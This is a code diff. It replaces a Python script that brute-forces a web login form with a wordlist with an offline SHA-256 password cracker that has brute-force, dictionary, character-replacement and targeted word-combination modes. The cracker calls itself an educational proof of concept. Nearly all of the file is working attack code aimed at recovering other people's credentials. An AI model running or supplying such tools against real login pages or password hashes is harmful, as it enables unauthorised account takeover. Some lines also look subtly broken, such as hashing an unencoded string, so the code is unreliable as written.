@@ -1,96 +1,145 @@
 import hashlib
-import requests
-import os  # Import the os module for file path handling
+import argparse
+import time
 
-HASH_ALGORITHM = "sha256"
-FILENAME = "wordlist.txt"
+start_time = time.time()
 
+def check_password(hash, password):
+	if(hashlib.sha256(password).hexdigest().upper()==hash.upper()):
+		print("PASSWORD CRACKED : "+password)
+		elapsed_time = time.time() - start_time
+		print("Time to crack : "+str(elapsed_time)+" seconds.")
+		quit()
 
-def main():
-    # Get the current script directory
-    script_directory = os.path.dirname(os.path.realpath(__file__))
-
-    # Construct the full path to the wordlist file
-    wordlist_path = os.path.join(script_directory, FILENAME)
-
-    # Check if the wordlist file exists
-    if not os.path.exists(wordlist_path):
-        print(f"Wordlist file '{FILENAME}' not found in the script directory.")
-        return
-
-    # Obtain the URL of the login form from the user
-    login_url = input("Enter the URL of the login form: ")
-
-    # Obtain the username from the user
-    username = input("Enter the username: ")
-
-    # Start the password brute-force process
-    brute_force_passwords(login_url, username, wordlist_path)
+def count_print(i):
+	i=i+1
+	if(i%1000000==0):
+		print("Tried "+str(i)+" possibilities.")
+	return i
 
 
-def brute_force_passwords(login_url, username, wordlist_path):
-    # Get the list of passwords from the wordlist file
-    passwords = load_passwords(wordlist_path)
+### BEGIN BRUTE FORCE ATTACK
 
-    # Iterate over the passwords and try each one
-    for password in passwords:
-        # Perform the login attempt
-        login_successful = perform_login(login_url, username, password)
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
-        # Check if the login was successful
-        if login_successful:
-            print("Password found:", password)
-            return  # If the password is found, exit the program
+def bruteforce_length(hash, init_password, target_length, current_length, i):
+	if(current_length==target_length):
+		i = count_print(i)
+		check_password(hash, init_password)
+	else:
+		for c in chars:
+			i = bruteforce_length(hash, init_password+c, target_length, current_length+1, i)
+	return i
 
-    print("Password not found in the list.")
+def bruteforce_attack(hash, max_length):
+	i=0
+	for l in range(1,max_length+1):
+		i = bruteforce_length(hash, "", l, 0, i)
 
+### END BRUTE FORCE ATTACK
 
-def perform_login(login_url, username, password):
-    try:
-        # Create the request data (username, password, etc.)
-        data = {"username": username, "password": password}
+### BEGIN SIMPLE DICTIONARY ATTACK
 
-        # Perform the HTTP POST request to the login form
-        response = requests.post(login_url, data=data)
+def dictionary_attack(hash, dict_filename):
+	i=0
+	with open(dict_filename) as f:
+		for line in f:
+			i = count_print(i)
+			password = line.rstrip()
+			check_password(hash, password)
 
-        # Check if the login was successful by analyzing the response
-        if response.ok:
-            response_body = response.text
-            if "login_success" in response_body:
-                # The login was successful
-                return True
-            else:
-                # The login was not successful
-                return False
-        else:
-            return False  # The login was not successful
+### END SIMPLE DICTIONARY ATTACK
 
-    except Exception as e:
-        return False  # Error and exception handling
+### BEGIN DICTIONARY ATTACK WITH REPLACEMENTS
 
+def get_transformations(password, replacements, from_index):
+	if(from_index==len(replacements)):
+		return [password]
+	else:
+		res = []
+		nexts = get_transformations(password, replacements, from_index+1)
+		repl = replacements[from_index]
+		for t in nexts:
+			res.append(t)
+			transformation = t.replace(repl[0], repl[1])
+			if(transformation!=t):
+				res.append(transformation)
+		return res
 
-def load_passwords(wordlist_path):
-    passwords = []
+def dict_attack_with_replacements(hash, dict_filename, replacements):
+	i=0
+	with open(dict_filename) as f:
+		for line in f:
+			i = count_print(i)
+			password = line.rstrip()
+			transformations = get_transformations(password, replacements, 0)
+			for t in transformations:
+				check_password(hash, t)
 
-    try:
-        with open(wordlist_path, "r") as file:
-            passwords = [line.strip() for line in file]
+### END DICTIONARY ATTACK WITH REPLACEMENTS
 
-    except Exception as e:
-        print("Error loading passwords:", str(e))
+### BEGIN TARGETED ATTACK
 
-    return passwords
+def generate_possibilities(combination, words):
+	result = [combination]
+	for w in words:
+		without = set(words)
+		without.remove(w)
+		new_combination = list(combination)
+		new_combination.append(w)
+		result.extend(generate_possibilities(new_combination, without))
+	return result
 
+def targeted_attack(hash, words):
+	possibilities = map(lambda l: "".join(l), generate_possibilities([], words))
+	i=0
+	for p in possibilities:
+		i = count_print(i)
+		check_password(hash, p)
 
-def hash_password(password):
-    try:
-        hashed_bytes = hashlib.sha256(password.encode("utf-8")).digest()
-        hashed_password = ''.join(format(byte, '02x') for byte in hashed_bytes)
-        return hashed_password
-    except Exception as e:
-        print("Error generating password hash:", str(e))
-        return None
+### END TARGETED ATTACK
 
+parser = argparse.ArgumentParser(description="Simple password cracker. "+ 
+	"Only a proof-of-concept for educational purposes. "+
+	" See github.com/mthambipillai/password-cracker for the full code and documentation.")
+parser.add_argument("hash", help="SHA256 hash of the password to crack.")
+parser.add_argument("method",
+	help="Cracking method to use. Possible values are : brute_force, dict, dict_repl, targeted. ")
+parser.add_argument("-l", "--length_max", type=int, default=5,
+	help="Maximum password length in 'brute_force' method. Default is 5.")
+parser.add_argument("-d", "--dictionary", default="",
+	help="File name of the dictionary to use in 'dict' or 'dict_repl' methods.")
+parser.add_argument("-w", "--words", default="",
+	help="List of words separated by commas. To be used as input to the 'targeted' method.")
+parser.add_argument("-r", "--replacements", default="",
+	help="List of replacements separated by commas. To be used as input to the 'dict_repl' method. "+
+	"Each replacement of a char 'o' by a char 'n' must be written 'o/n'.")
+args = parser.parse_args()
 
-if __name__ == "__main__":
-    main()
+if(args.method=="brute_force"):
+	bruteforce_attack(args.hash, args.length_max)
+elif(args.method=="dict"):
+	if(args.dictionary==""):
+		print("Method 'dict' requires argument 'dictionary'")
+		quit()
+	dictionary_attack(args.hash, args.dictionary)
+elif(args.method=="dict_repl"):
+	if(args.dictionary==""):
+		print("Method 'dict_repl' requires argument 'dictionary'")
+		quit()
+	if(args.replacements==""):
+		print("Method 'dict_repl' requires argument 'replacements'")
+		quit()
+	replacements = map(lambda r: r.split("/"), args.replacements.split(","))
+	dict_attack_with_replacements(args.hash, args.dictionary, replacements)
+elif(args.method=="targeted"):
+	if(args.words==""):
+		print("Method 'targeted' requires argument 'words'")
+		quit()
+	words_set = set(args.words.split(","))
+	targeted_attack(args.hash, words_set)
+else:
+	print("Cracking method '"+args.method+"' doesn't exist.")
+	quit()
+
+print("Failed to crack the password with this method and these parameters.")
